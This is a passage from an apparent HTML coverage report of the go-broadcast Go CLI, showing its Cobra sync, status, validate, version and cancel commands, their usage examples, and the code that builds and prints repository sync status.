  go-broadcast sync org/repo1 org/repo2    # Sync specific repositories
  go-broadcast sync --dry-run              # Preview changes only

  # Debugging and monitoring
  go-broadcast sync -v                     # Debug level output
  go-broadcast sync -vv                    # Trace level with details
  go-broadcast sync -vvv                   # Trace with caller info

  # Component-specific debugging
  go-broadcast sync --debug-git            # Show git commands and output
  go-broadcast sync --debug-api            # Show GitHub API requests
  go-broadcast sync --debug-transform      # Show file transformations
  go-broadcast sync --debug-config         # Show configuration validation
  go-broadcast sync --debug-state          # Show state discovery process

  # Structured logging for automation
  go-broadcast sync --json -v              # JSON output for log analysis
  go-broadcast sync --log-format json      # Alternative JSON syntax

  # Comprehensive debugging sessions
  go-broadcast sync -vv --debug-git --debug-api    # Multiple components
  go-broadcast sync -vvv --debug-git 2&gt; debug.log # Save to file

  # Performance monitoring
  go-broadcast sync --json 2&gt;&amp;1 | jq 'select(.duration_ms &gt; 1000)'

  # Troubleshooting authentication
  go-broadcast sync --debug-git -v         # Debug git auth issues

  # Production monitoring with structured logs
  go-broadcast sync --json 2&gt;&amp;1 | fluentd`,
                Aliases: []string{"s"},
                RunE:    createRunSyncWithVerbose(config),
        }
}</span>

// createStatusCmdWithVerbose creates a status command with verbose logging support.
//
// Parameters:
// - config: LogConfig containing logging and debug configuration
//
// Returns:
// - Cobra command configured for status operations with verbose support
func createStatusCmdWithVerbose(config *LogConfig) *cobra.Command <span class="cov8" title="1">{
        return &amp;cobra.Command{
                Use:   "status",
                Short: "Show synchronization status of target repositories",
                Long: `Display the current synchronization status of all target repositories.

Shows comprehensive status information including:
- Last successful sync commit SHA and timestamp
- Available updates from source repository
- Active pull request status and details
- Repository sync health and any issues
- Time since last sync and sync frequency`,
                Example: `  # Basic status check
  go-broadcast status                    # Show status for all targets
  go-broadcast status --config sync.yaml # Use specific config file

  # Detailed status with debugging
  go-broadcast status -v                 # Debug level status details
  go-broadcast status --debug-state -v   # Debug state discovery process

  # Automation and monitoring
  go-broadcast status --json             # Machine-readable status output
  go-broadcast status --json | jq .      # Pretty-print JSON status

  # Common status workflows
  go-broadcast status 2&gt;&amp;1 | tee status.log     # Save status to file
  go-broadcast status &amp;&amp; go-broadcast sync       # Check status then sync`,
                Aliases: []string{"st"},
                RunE:    createRunStatusWithVerbose(config),
        }
}</span>

// createValidateCmdWithVerbose creates a validate command with verbose logging support.
//
// Parameters:
// - config: LogConfig containing logging and debug configuration
//
// Returns:
// - Cobra command configured for validation operations with verbose support
func createValidateCmdWithVerbose(config *LogConfig) *cobra.Command <span class="cov8" title="1">{
        return &amp;cobra.Command{
                Use:   "validate",
                Short: "Validate configuration file",
                Long: `Validate the configuration file for syntax and semantic errors.

Performs comprehensive validation including:
- YAML syntax verification
- Required field presence
- Repository name format validation
- File path safety checks
- Transform configuration validation
- Duplicate detection across targets and file mappings`,
                Example: `  # Basic validation
  go-broadcast validate                    # Validate default config file
  go-broadcast validate --config sync.yaml # Validate specific file

  # Detailed validation debugging
  go-broadcast validate --debug-config -v  # Show validation steps
  go-broadcast validate -vv               # Trace level validation details

  # Automation and CI/CD
  go-broadcast validate &amp;&amp; echo "Config OK" # Exit code validation
  go-broadcast validate --json            # Machine-readable output

  # Common validation workflows
  go-broadcast validate --config prod.yaml --debug-config  # Debug production config
  go-broadcast validate 2&gt;&amp;1 | tee validation.log         # Save validation output`,
                Aliases: []string{"v", "check"},
                RunE:    createRunValidateWithVerbose(config),
        }
}</span>

// createVersionCmdWithVerbose creates a version command with verbose logging support.
//
// Parameters:
// - config: LogConfig containing logging and debug configuration
//
// Returns:
// - Cobra command configured for version operations with verbose support
func createVersionCmdWithVerbose(config *LogConfig) *cobra.Command <span class="cov8" title="1">{
        return &amp;cobra.Command{
                Use:   "version",
                Short: "Print version and build information",
                Long: `Print comprehensive version information including build details.

Displays detailed information about:
- go-broadcast version and release information
- Build timestamp and commit SHA
- Go compiler version used for build
- Operating system and architecture
- Runtime environment details`,
                Example: `  # Basic version information
  go-broadcast version                   # Show version details

  # Include version in diagnostic collection
  go-broadcast version &amp;&amp; go-broadcast diagnose &gt; full-info.json

  # Automation and scripting
  go-broadcast version --json            # Machine-readable version output
  VERSION=$(go-broadcast version --json | jq -r '.version')  # Extract version`,
                RunE: createRunVersionWithVerbose(config),
        }
}</span>

// createSyncCmd creates an isolated sync command with the given flags
func createSyncCmd(flags *Flags) *cobra.Command <span class="cov8" title="1">{
        return &amp;cobra.Command{
                Use:   "sync [targets...]",
                Short: "Synchronize files to target repositories",
                Long: `Synchronize files from the source template repository to one or more target repositories.

If no targets are specified, all targets in the configuration file will be synchronized.
Target repositories can be specified as arguments to sync only specific repos.`,
                Example: `  # Basic operations
  go-broadcast sync                        # Sync all targets from config
  go-broadcast sync --config sync.yaml     # Use specific config file
  go-broadcast sync org/repo1 org/repo2    # Sync only specified repositories
  go-broadcast sync --dry-run              # Preview changes without making them

  # Debugging and troubleshooting
  go-broadcast sync --log-level debug      # Enable debug logging
  go-broadcast sync --log-level trace      # Maximum verbosity

  # Common workflows
  go-broadcast validate &amp;&amp; go-broadcast sync --dry-run  # Validate then preview
  go-broadcast sync --dry-run | tee preview.log        # Save preview output

  # For troubleshooting, use verbose commands:
  # go-broadcast sync -v --debug-git (requires go-broadcast with verbose support)`,
                Aliases: []string{"s"},
                RunE:    createRunSync(flags),
        }
}</span>

// createStatusCmd creates an isolated status command with the given flags
func createStatusCmd(flags *Flags) *cobra.Command <span class="cov8" title="1">{
        return &amp;cobra.Command{
                Use:   "status",
                Short: "Show status of target repositories",
                Long: `Display the current status of all target repositories, including:
- Last sync commit
- Available updates
- Pull request status`,
                Aliases: []string{"st"},
                RunE:    createRunStatus(flags),
        }
}</span>

// createValidateCmd creates an isolated validate command with the given flags
func createValidateCmd(flags *Flags) *cobra.Command <span class="cov8" title="1">{
        return &amp;cobra.Command{
                Use:   "validate",
                Short: "Validate configuration file",
                Long: `Validate the configuration file for syntax and semantic errors.

Performs comprehensive validation including:
- YAML syntax verification
- Required field presence
- Repository name format validation
- File path safety checks
- Transform configuration validation
- Duplicate detection across targets and file mappings`,
                Example: `  # Basic validation
  go-broadcast validate                    # Validate default config file
  go-broadcast validate --config sync.yaml # Validate specific file

  # Debug validation issues
  go-broadcast validate --log-level debug  # Show detailed validation steps

  # Automation workflows
  go-broadcast validate &amp;&amp; echo "Config valid"      # Use exit code
  go-broadcast validate 2&gt;&amp;1 | tee validation.log  # Save output

  # For detailed debugging, use verbose validate command:
  # go-broadcast validate --debug-config -v (requires verbose support)`,
                Aliases: []string{"v", "check"},
                RunE:    createRunValidate(flags),
        }
}</span>

// createVersionCmd creates an isolated version command with the given flags
func createVersionCmd(flags *Flags) *cobra.Command <span class="cov8" title="1">{
        return &amp;cobra.Command{
                Use:   "version",
                Short: "Print version information",
                Long:  `Print detailed version information including build details.`,
                RunE:  createRunVersion(flags),
        }
}</span>

// createRunStatus creates an isolated status run function with the given flags
func createRunStatus(_ *Flags) func(*cobra.Command, []string) error <span class="cov8" title="1">{
        return func(cmd *cobra.Command, _ []string) error </span><span class="cov8" title="1">{
                ctx := cmd.Context()

                // Get isolated logger from context, fallback to global if not available
                logger, ok := ctx.Value(loggerContextKey{}).(*logrus.Logger)
                if !ok </span><span class="cov8" title="1">{
                        logger = logrus.StandardLogger()
                }</span>
                <span class="cov8" title="1">_ = logger.WithField("command", "status")

                // For now, use a placeholder implementation - this will be implemented properly
                // when we address the status command's specific needs
                return ErrStatusNotImplemented</span>
        }
}

// createRunValidate creates an isolated validate run function with the given flags
func createRunValidate(flags *Flags) func(*cobra.Command, []string) error <span class="cov8" title="1">{
        return func(cmd *cobra.Command, _ []string) error </span><span class="cov8" title="1">{
                ctx := cmd.Context()

                // Get isolated logger from context, fallback to global if not available
                logger, ok := ctx.Value(loggerContextKey{}).(*logrus.Logger)
                if !ok </span><span class="cov8" title="1">{
                        logger = logrus.StandardLogger()
                }</span>
                <span class="cov8" title="1">_ = logger.WithField("command", "validate")

                cfg, err := loadConfigWithFlags(flags, logger)
                if err != nil </span><span class="cov8" title="1">{
                        return fmt.Errorf("failed to load configuration: %w", err)
                }</span>

                <span class="cov8" title="1">if err := cfg.ValidateWithLogging(context.Background(), nil); err != nil </span><span class="cov0" title="0">{
                        return fmt.Errorf("validation failed: %w", err)
                }</span>

                <span class="cov8" title="1">output.Success("Configuration is valid")
                return nil</span>
        }
}

// createRunVersion creates an isolated version run function with the given flags
func createRunVersion(_ *Flags) func(*cobra.Command, []string) error <span class="cov8" title="1">{
        return func(cmd *cobra.Command, _ []string) error </span><span class="cov8" title="1">{
                ctx := cmd.Context()

                // Get isolated logger from context, fallback to global if not available
                logger, ok := ctx.Value(loggerContextKey{}).(*logrus.Logger)
                if !ok </span><span class="cov8" title="1">{
                        logger = logrus.StandardLogger()
                }</span>
                <span class="cov8" title="1">_ = logger.WithField("command", "version")

                // Use the same implementation as the global version command
                return runVersion(cmd, []string{})</span>
        }
}

// createRunSyncWithVerbose creates a sync run function with verbose logging support.
//
// This function creates a run function that uses LogConfig for verbose sync operations
// with component-specific debugging and verbose logging capabilities.
//
// Parameters:
// - config: LogConfig containing logging and debug configuration
//
// Returns:
// - Function that can be used as RunE for Cobra sync commands
func createRunSyncWithVerbose(config *LogConfig) func(*cobra.Command, []string) error <span class="cov8" title="1">{
        return func(cmd *cobra.Command, args []string) error </span><span class="cov8" title="1">{
                ctx := cmd.Context()
                log := logrus.WithField("command", "sync")

                // For Phase 1, delegate to existing sync implementation
                // This maintains functionality while adding verbose flag support
                // In later phases, this will include component-specific debugging

                // Load configuration using LogConfig
                cfg, err := loadConfigWithLogConfig(config)
                if err != nil </span><span class="cov8" title="1">{
                        return fmt.Errorf("failed to load configuration: %w", err)
                }</span>

                // Filter targets if specified
                <span class="cov8" title="1">targets := args
                if len(targets) &gt; 0 </span><span class="cov8" title="1">{
                        log.WithField("targets", targets).Info("Syncing specific targets")
                }</span> else<span class="cov8" title="1"> {
                        log.Info("Syncing all configured targets")
                }</span>

                // Show dry-run warning
                <span class="cov8" title="1">if config.DryRun </span><span class="cov8" title="1">{
                        output.Warn("DRY-RUN MODE: No changes will be made to repositories")
                }</span>

                // Initialize sync engine with LogConfig
                <span class="cov8" title="1">engine, err := createSyncEngineWithLogConfig(ctx, cfg, config)
                if err != nil </span><span class="cov0" title="0">{
                        return fmt.Errorf("failed to initialize sync engine: %w", err)
                }</span>

                // Execute sync
                <span class="cov8" title="1">if err := engine.Sync(ctx, targets); err != nil </span><span class="cov8" title="1">{
                        return fmt.Errorf("sync failed: %w", err)
                }</span>

                <span class="cov0" title="0">output.Success("Sync completed successfully")
                return nil</span>
        }
}

// createRunStatusWithVerbose creates a status run function with verbose logging support.
//
// Parameters:
// - config: LogConfig containing logging and debug configuration
//
// Returns:
// - Function that can be used as RunE for Cobra status commands
func createRunStatusWithVerbose(_ *LogConfig) func(*cobra.Command, []string) error <span class="cov8" title="1">{
        return func(_ *cobra.Command, _ []string) error </span><span class="cov8" title="1">{
                log := logrus.WithField("command", "status")
                _ = log

                // For Phase 1, maintain existing behavior
                return ErrStatusNotImplemented
        }</span>
}

// createRunValidateWithVerbose creates a validate run function with verbose logging support.
//
// Parameters:
// - config: LogConfig containing logging and debug configuration
//
// Returns:
// - Function that can be used as RunE for Cobra validate commands
func createRunValidateWithVerbose(config *LogConfig) func(*cobra.Command, []string) error <span class="cov8" title="1">{
        return func(_ *cobra.Command, _ []string) error </span><span class="cov8" title="1">{
                log := logrus.WithField("command", "validate")
                _ = log

                cfg, err := loadConfigWithLogConfig(config)
                if err != nil </span><span class="cov0" title="0">{
                        return fmt.Errorf("failed to load configuration: %w", err)
                }</span>

                <span class="cov8" title="1">if err := cfg.ValidateWithLogging(context.Background(), config); err != nil </span><span class="cov0" title="0">{
                        return fmt.Errorf("validation failed: %w", err)
                }</span>

                <span class="cov8" title="1">output.Success("Configuration is valid")
                return nil</span>
        }
}

// createRunVersionWithVerbose creates a version run function with verbose logging support.
//
// Parameters:
// - config: LogConfig containing logging and debug configuration
//
// Returns:
// - Function that can be used as RunE for Cobra version commands
func createRunVersionWithVerbose(_ *LogConfig) func(*cobra.Command, []string) error <span class="cov8" title="1">{
        return func(cmd *cobra.Command, _ []string) error </span><span class="cov8" title="1">{
                log := logrus.WithField("command", "version")
                _ = log

                // Use the same implementation as the global version command
                return runVersion(cmd, []string{})
        }</span>
}

// createCancelCmd creates an isolated cancel command with the given flags
func createCancelCmd(flags *Flags) *cobra.Command <span class="cov8" title="1">{
        return &amp;cobra.Command{
                Use:   "cancel [targets...]",
                Short: "Cancel active sync operations",
                Long: `Cancel active sync operations by closing open pull requests and optionally deleting sync branches.

This command finds all open sync pull requests for the specified targets (or all targets if none specified)
and closes them with a descriptive comment. By default, it also deletes the associated sync branches
to clean up the repositories.`,
                Example: `  # Cancel all active syncs
  go-broadcast cancel --config sync.yaml

  # Cancel syncs for specific repositories
  go-broadcast cancel org/repo1 org/repo2

  # Preview what would be canceled (dry run)
  go-broadcast cancel --dry-run --config sync.yaml

  # Close PRs but keep sync branches
  go-broadcast cancel --keep-branches --config sync.yaml`,
                Aliases: []string{"c"},
                RunE:    createRunCancel(flags),
        }
}</span>

// createCancelCmdWithVerbose creates a cancel command with verbose logging support
func createCancelCmdWithVerbose(config *LogConfig) *cobra.Command <span class="cov8" title="1">{
        return &amp;cobra.Command{
                Use:   "cancel [targets...]",
                Short: "Cancel active sync operations",
                Long: `Cancel active sync operations by closing open pull requests and optionally deleting sync branches.

This command finds all open sync pull requests for the specified targets (or all targets if none specified)
and closes them with a descriptive comment. By default, it also deletes the associated sync branches
to clean up the repositories.`,
                Example: `  # Cancel all active syncs
  go-broadcast cancel --config sync.yaml

  # Cancel syncs for specific repositories
  go-broadcast cancel org/repo1 org/repo2

  # Preview what would be canceled (dry run)
  go-broadcast cancel --dry-run --config sync.yaml

  # Debug cancel operations
  go-broadcast cancel -v --debug-api --config sync.yaml`,
                Aliases: []string{"c"},
                RunE:    createRunCancelWithVerbose(config),
        }
}</span>

// createRunCancel creates an isolated cancel run function with the given flags
func createRunCancel(_ *Flags) func(*cobra.Command, []string) error <span class="cov8" title="1">{
        return func(cmd *cobra.Command, args []string) error </span><span class="cov8" title="1">{
                ctx := cmd.Context()

                // Get isolated logger from context, fallback to global if not available
                logger, ok := ctx.Value(loggerContextKey{}).(*logrus.Logger)
                if !ok </span><span class="cov8" title="1">{
                        logger = logrus.StandardLogger()
                }</span>
                <span class="cov8" title="1">_ = logger.WithField("command", "cancel")

                // For now, delegate to the global cancel implementation
                // This maintains functionality while providing isolated flag support
                return runCancel(cmd, args)</span>
        }
}

// createRunCancelWithVerbose creates a cancel run function with verbose logging support
func createRunCancelWithVerbose(_ *LogConfig) func(*cobra.Command, []string) error <span class="cov8" title="1">{
        return func(cmd *cobra.Command, args []string) error </span><span class="cov8" title="1">{
                log := logrus.WithField("command", "cancel")
                _ = log

                // For Phase 1, delegate to existing cancel implementation
                return runCancel(cmd, args)
        }</span>
}
</pre>

		<pre class="file" id="file15" style="display: none">package cli

import (
        "context"
        "encoding/json"
        "errors"
        "fmt"
        "sort"
        "strings"
        "time"

        "github.com/sirupsen/logrus"
        "github.com/spf13/cobra"

        "github.com/mrz1836/go-broadcast/internal/config"
        "github.com/mrz1836/go-broadcast/internal/gh"
        "github.com/mrz1836/go-broadcast/internal/logging"
        "github.com/mrz1836/go-broadcast/internal/output"
        "github.com/mrz1836/go-broadcast/internal/state"
)

//nolint:gochecknoglobals // Package-level variable for CLI flag
var (
        jsonOutput bool
)

// initStatus initializes status command flags
func initStatus() <span class="cov8" title="1">{
        statusCmd.Flags().BoolVar(&amp;jsonOutput, "json", false, "Output status in JSON format")
}</span>

//nolint:gochecknoglobals // Cobra commands are designed to be global variables
var statusCmd = &amp;cobra.Command{
        Use:   "status",
        Short: "Show sync state for all targets",
        Long: `Display the current synchronization state for all target repositories.

Shows information about:
  ‚Ä¢ Open pull requests
  ‚Ä¢ Sync branches
  ‚Ä¢ Last sync timestamp and commit
  ‚Ä¢ Out-of-date targets`,
        Example: `  # Show status for all targets
  go-broadcast status --config sync.yaml

  # Output in JSON format
  go-broadcast status --json`,
        Aliases: []string{"st"},
        RunE:    runStatus,
}

// SyncStatus represents the sync state for display
type SyncStatus struct {
        Source  SourceStatus   `json:"source,omitempty"`  // For backward compatibility
        Targets []TargetStatus `json:"targets,omitempty"` // For backward compatibility
        Groups  []GroupStatus  `json:"groups,omitempty"`  // Group-based status
}

// GroupStatus represents the status of a sync group
type GroupStatus struct {
        Name      string         `json:"name"`
        ID        string         `json:"id"`
        Priority  int            `json:"priority"`
        Enabled   bool           `json:"enabled"`
        DependsOn []string       `json:"depends_on,omitempty"`
        State     string         `json:"state"` // "ready", "synced", "pending", "error", "disabled"
        Source    SourceStatus   `json:"source"`
        Targets   []TargetStatus `json:"targets"`
}

// SourceStatus represents source repository status
type SourceStatus struct {
        Repository   string `json:"repository"`
        Branch       string `json:"branch"`
        LatestCommit string `json:"latest_commit"`
}

// TargetStatus represents a target repository status
type TargetStatus struct {
        Repository  string           `json:"repository"`
        State       string           `json:"state"` // "synced", "outdated", "pending", "error"
        SyncBranch  *string          `json:"sync_branch,omitempty"`
        PullRequest *PullRequestInfo `json:"pull_request,omitempty"`
        LastSync    *SyncInfo        `json:"last_sync,omitempty"`
        Error       *string          `json:"error,omitempty"`
}

// PullRequestInfo contains PR details
type PullRequestInfo struct {
        Number int    `json:"number"`
        State  string `json:"state"`
        URL    string `json:"url"`
        Title  string `json:"title"`
}

// SyncInfo contains last sync details
type SyncInfo struct {
        Timestamp string `json:"timestamp"`
        Commit    string `json:"commit"`
}

func runStatus(cmd *cobra.Command, _ []string) error <span class="cov8" title="1">{
        ctx := cmd.Context()
        _ = logrus.WithField("command", "status")

        // Load configuration
        cfg, err := loadConfig()
        if err != nil </span><span class="cov8" title="1">{
                return fmt.Errorf("failed to load configuration: %w", err)
        }</span>

        // Initialize state discovery with real implementations
        <span class="cov8" title="1">status, err := getRealStatus(ctx, cfg)
        if err != nil </span><span class="cov8" title="1">{
                return fmt.Errorf("failed to discover status: %w", err)
        }</span>

        // Output status
        <span class="cov0" title="0">if jsonOutput </span><span class="cov0" title="0">{
                return outputJSON(status)
        }</span>

        <span class="cov0" title="0">return outputTextStatus(status)</span>
}

func getRealStatus(ctx context.Context, cfg *config.Config) (*SyncStatus, error) <span class="cov8" title="1">{
        // Create logger for GitHub operations
        logger := logrus.New()
        logger.SetLevel(logrus.InfoLevel)

        // Create logging config with minimal debug settings
        logConfig := &amp;logging.LogConfig{
                Debug: logging.DebugFlags{
                        State: false,
                        API:   false,
                },
                Verbose: 0,
        }

        // Initialize GitHub client with comprehensive error handling
        ghClient, err := gh.NewClient(ctx, logger, logConfig)
        if err != nil </span><span class="cov8" title="1">{
                // Provide specific error messages for common issues
                switch </span>{
                case errors.Is(err, gh.ErrGHNotFound):<span class="cov0" title="0">
                        return nil, fmt.Errorf("%w: Please install GitHub CLI: https://cli.github.com/", gh.ErrGHNotFound)</span>
                case errors.Is(err, gh.ErrNotAuthenticated):<span class="cov8" title="1">
                        return nil, fmt.Errorf("%w: Please run: gh auth login", gh.ErrNotAuthenticated)</span>
                default:<span class="cov0" title="0">
                        return nil, fmt.Errorf("failed to initialize GitHub client: %w", err)</span>
                }
        }

        // Initialize state discoverer
        <span class="cov8" title="1">discoverer := state.NewDiscoverer(ghClient, logger, logConfig)

        // Discover current state with comprehensive error handling
        currentState, err := discoverer.DiscoverState(ctx, cfg)
        if err != nil </span><span class="cov8" title="1">{
                // Provide specific error messages for common GitHub API issues
                switch </span>{
                case errors.Is(err, gh.ErrRateLimited):<span class="cov0" title="0">
                        return nil, fmt.Errorf("%w: Please try again later", gh.ErrRateLimited)</span>
                case errors.Is(err, gh.ErrBranchNotFound):<span class="cov8" title="1">
                        return nil, fmt.Errorf("%w: Please check your configuration", gh.ErrBranchNotFound)</span>
                default:<span class="cov0" title="0">
                        return nil, fmt.Errorf("failed to discover sync state: %w", err)</span>
                }
        }

        // Convert to CLI status format
        <span class="cov0" title="0">return convertStateToStatus(currentState, cfg), nil</span>
}

// convertStateToStatus converts internal state to CLI status format
func convertStateToStatus(s *state.State, cfg *config.Config) *SyncStatus <span class="cov8" title="1">{
        // Check if we have groups in the configuration
        if cfg != nil &amp;&amp; len(cfg.Groups) &gt; 0 </span><span class="cov0" title="0">{
                return convertStateToGroupStatus(s, cfg)
        }</span>

        // Legacy format for backward compatibility
        <span class="cov8" title="1">status := &amp;SyncStatus{
                Source: SourceStatus{
                        Repository:   s.Source.Repo,
                        Branch:       s.Source.Branch,
                        LatestCommit: s.Source.LatestCommit,
                },
                Targets: make([]TargetStatus, 0, len(s.Targets)),
        }

        // Get sorted list of target repositories for deterministic order
        repos := make([]string, 0, len(s.Targets))
        for repo := range s.Targets </span><span class="cov8" title="1">{
                repos = append(repos, repo)
        }</span>
        <span class="cov8" title="1">sort.Strings(repos)

        // Convert each target state in sorted order
        for _, repo := range repos </span><span class="cov8" title="1">{
                targetState := s.Targets[repo]
                targetStatus := TargetStatus{
                        Repository: targetState.Repo,
                        State:      convertSyncStatus(targetState.Status),
                }

                // Add last sync information if available
                if targetState.LastSyncCommit != "" &amp;&amp; targetState.LastSyncTime != nil </span><span class="cov8" title="1">{
                        targetStatus.LastSync = &amp;SyncInfo{
                                Timestamp: targetState.LastSyncTime.Format(time.RFC3339),
                                Commit:    targetState.LastSyncCommit,
                        }
                }</span>

                // Add sync branch if available (use the most recent one)
                <span class="cov8" title="1">if len(targetState.SyncBranches) &gt; 0 </span><span class="cov8" title="1">{
                        // Find the most recent sync branch
                        var mostRecent *state.SyncBranch
                        for i := range targetState.SyncBranches </span><span class="cov8" title="1">{
                                branch := &amp;targetState.SyncBranches[i]
                                if branch.Metadata != nil </span><span class="cov8" title="1">{
                                        if mostRecent == nil || branch.Metadata.Timestamp.After(mostRecent.Metadata.Timestamp) </span><span class="cov8" title="1">{
                                                mostRecent = branch
                                        }</span>
                                }
                        }
                        <span class="cov8" title="1">if mostRecent != nil </span><span class="cov8" title="1">{
                                targetStatus.SyncBranch = &amp;mostRecent.Name
                        }</span>
                }

                // Add pull request information if available
                <span class="cov8" title="1">if len(targetState.OpenPRs) &gt; 0 </span><span class="cov8" title="1">{
                        // Use the first open PR (most recent)
                        pr := targetState.OpenPRs[0]
                        targetStatus.PullRequest = &amp;PullRequestInfo{
                                Number: pr.Number,
                                State:  strings.ToLower(pr.State),
                                URL:    fmt.Sprintf("https://github.com/%s/pull/%d", targetState.Repo, pr.Number),
                                Title:  pr.Title,
                        }
                }</span>

                <span class="cov8" title="1">status.Targets = append(status.Targets, targetStatus)</span>
        }

        <span class="cov8" title="1">return status</span>
}

// convertSyncStatus converts internal sync status to CLI display format
func convertSyncStatus(s state.SyncStatus) string <span class="cov8" title="1">{
        switch s </span>{
        case state.StatusUpToDate:<span class="cov8" title="1">
                return "synced"</span>
        case state.StatusBehind:<span class="cov8" title="1">
                return "outdated"</span>
        case state.StatusPending:<span class="cov8" title="1">
                return "pending"</span>
        case state.StatusConflict:<span class="cov8" title="1">
                return "error"</span>
        case state.StatusUnknown:<span class="cov8" title="1">
                return "unknown"</span>
        default:<span class="cov8" title="1">
                return "unknown"</span>
        }
}

// convertStateToGroupStatus converts state to group-based status format
func convertStateToGroupStatus(s *state.State, cfg *config.Config) *SyncStatus <span class="cov8" title="1">{
        status := &amp;SyncStatus{
                Groups: make([]GroupStatus, 0),
        }

        // Get groups from configuration
        groups := cfg.Groups

        // Convert each group to status
        for _, group := range groups </span><span class="cov8" title="1">{
                groupStatus := GroupStatus{
                        Name:      group.Name,
                        ID:        group.ID,
                        Priority:  group.Priority,
                        Enabled:   group.Enabled == nil || *group.Enabled,
                        DependsOn: group.DependsOn,
                        Source: SourceStatus{
                                Repository:   group.Source.Repo,
                                Branch:       group.Source.Branch,
                                LatestCommit: s.Source.LatestCommit,
                        },
                        Targets: make([]TargetStatus, 0),
                }

                // Determine group state based on targets
                allSynced := true
                hasError := false
                hasPending := false

                // Process targets for this group
                for _, target := range group.Targets </span><span class="cov8" title="1">{
                        if targetState, exists := s.Targets[target.Repo]; exists </span><span class="cov8" title="1">{
                                targetStatus := TargetStatus{
                                        Repository: targetState.Repo,
                                        State:      convertSyncStatus(targetState.Status),
                                }

                                // Add last sync information if available
                                if targetState.LastSyncCommit != "" &amp;&amp; targetState.LastSyncTime != nil </span><span class="cov0" title="0">{
                                        targetStatus.LastSync = &amp;SyncInfo{
                                                Timestamp: targetState.LastSyncTime.Format(time.RFC3339),
                                                Commit:    targetState.LastSyncCommit,
                                        }
                                }</span>

                                // Add sync branch if available
                                <span class="cov8" title="1">if len(targetState.SyncBranches) &gt; 0 </span><span class="cov0" title="0">{
                                        var mostRecent *state.SyncBranch
                                        for i := range targetState.SyncBranches </span><span class="cov0" title="0">{
                                                branch := &amp;targetState.SyncBranches[i]
                                                if branch.Metadata != nil </span><span class="cov0" title="0">{
                                                        if mostRecent == nil || branch.Metadata.Timestamp.After(mostRecent.Metadata.Timestamp) </span><span class="cov0" title="0">{
                                                                mostRecent = branch
                                                        }</span>
                                                }
                                        }
                                        <span class="cov0" title="0">if mostRecent != nil </span><span class="cov0" title="0">{
                                                targetStatus.SyncBranch = &amp;mostRecent.Name
                                        }</span>
                                }

                                // Add pull request information if available
                                <span class="cov8" title="1">if len(targetState.OpenPRs) &gt; 0 </span><span class="cov0" title="0">{
                                        pr := targetState.OpenPRs[0]
                                        targetStatus.PullRequest = &amp;PullRequestInfo{
                                                Number: pr.Number,
                                                State:  strings.ToLower(pr.State),
                                                URL:    fmt.Sprintf("https://github.com/%s/pull/%d", targetState.Repo, pr.Number),
                                                Title:  pr.Title,
                                        }
                                }</span>

                                // Add error if status is conflict/error
                                <span class="cov8" title="1">if targetState.Status == state.StatusConflict </span><span class="cov0" title="0">{
                                        errMsg := "Repository has conflicts that need manual resolution"
                                        targetStatus.Error = &amp;errMsg
                                }</span>

                                <span class="cov8" title="1">groupStatus.Targets = append(groupStatus.Targets, targetStatus)

                                // Update group state flags
                                if targetStatus.State != "synced" </span><span class="cov0" title="0">{
                                        allSynced = false
                                }</span>
                                <span class="cov8" title="1">if targetStatus.State == "error" </span><span class="cov0" title="0">{
                                        hasError = true
                                }</span>
                                <span class="cov8" title="1">if targetStatus.State == "pending" </span><span class="cov0" title="0">{
                                        hasPending = true
                                }</span>
                        }
                }

                // Set group state
                <span class="cov8" title="1">if !groupStatus.Enabled </span><span class="cov8" title="1">{
                        groupStatus.State = "disabled"
                }</span> else<span class="cov8" title="1"> if hasError </span><span class="cov0" title="0">{
                        groupStatus.State = "error"
                }</span> else<span class="cov8" title="1"> if hasPending </span><span class="cov0" title="0">{
                        groupStatus.State = "pending"
                }</span> else<span class="cov8" title="1"> if allSynced </span><span class="cov8" title="1">{
                        groupStatus.State = "synced"
                }</span> else<span class="cov0" title="0"> {
                        groupStatus.State = "ready"
                }</span>

                <span class="cov8" title="1">status.Groups = append(status.Groups, groupStatus)</span>
        }

        // Sort groups by priority
        <span class="cov8" title="1">sort.Slice(status.Groups, func(i, j int) bool </span><span class="cov0" title="0">{
                return status.Groups[i].Priority &lt; status.Groups[j].Priority
        }</span>)

        <span class="cov8" title="1">return status</span>
}

func outputJSON(status *SyncStatus) error <span class="cov8" title="1">{
        encoder := json.NewEncoder(output.Stdout())
        encoder.SetIndent("", "  ")
        return encoder.Encode(status)
}</span>

func outputTextStatus(status *SyncStatus) error <span class="cov8" title="1">{
        // Check if we have groups or legacy format
        if len(status.Groups) &gt; 0 </span><span class="cov0" title="0">{
                return outputGroupTextStatus(status)
        }</span>

        // Legacy format display
        <span class="cov8" title="1">output.Info(fmt.Sprintf("Source: %s (branch: %s)", status.Source.Repository, status.Source.Branch))
        output.Info(fmt.Sprintf("Latest commit: %s", status.Source.LatestCommit))
        output.Info("")

        output.Info(fmt.Sprintf("Targets (%d):", len(status.Targets)))

        for _, target := range status.Targets </span><span class="cov8" title="1">{
                // Status icon
                var icon string

                switch target.State </span>{
                case "synced":<span class="cov8" title="1">
                        icon = "‚úì"</span>
                case "outdated":<span class="cov8" title="1">
                        icon = "‚ö†"</span>
                case "pending":<span class="cov8" title="1">
                        icon = "‚è≥"</span>
                case "error":<span class="cov8" title="1">
                        icon = "‚úó"</span>
                default:<span class="cov8" title="1">
                        icon = "?"</span>
                }

                <span class="cov8" title="1">output.Info(fmt.Sprintf("  %s %s [%s]", icon, target.Repository, target.State))

                if target.PullRequest != nil </span><span class="cov8" title="1">{
                        output.Info(fmt.Sprintf("    PR #%d: %s (%s)",
                                target.PullRequest.Number,
                                target.PullRequest.Title,
                                target.PullRequest.State))
                        output.Info(fmt.Sprintf("    URL: %s", target.PullRequest.URL))
                }</span>

                <span class="cov8" title="1">if target.LastSync != nil </span><span class="cov8" title="1">{
                        output.Info(fmt.Sprintf("    Last sync: %s (commit: %s)",
                                target.LastSync.Timestamp,
                                target.LastSync.Commit[:7]))
                }</span>

                <span class="cov8" title="1">if target.SyncBranch != nil </span><span class="cov8" title="1">{
                        output.Info(fmt.Sprintf("    Branch: %s", *target.SyncBranch))
                }</span>

                <span class="cov8" title="1">if target.Error != nil </span><span class="cov8" title="1">{
                        output.Error(fmt.Sprintf("    Error: %s", *target.Error))
                }</span>

                <span class="cov8" title="1">output.Info("")</span>
        }

        // Summary
        <span class="cov8" title="1">synced := 0
        outdated := 0
        pending := 0
        errors := 0

        for _, t := range status.Targets </span><span class="cov8" title="1">{
                switch t.State </span>{
                case "synced":<span class="cov8" title="1">
                        synced++</span>
                case "outdated":<span class="cov8" title="1">
                        outdated++</span>
                case "pending":<span class="cov8" title="1">
                        pending++</span>
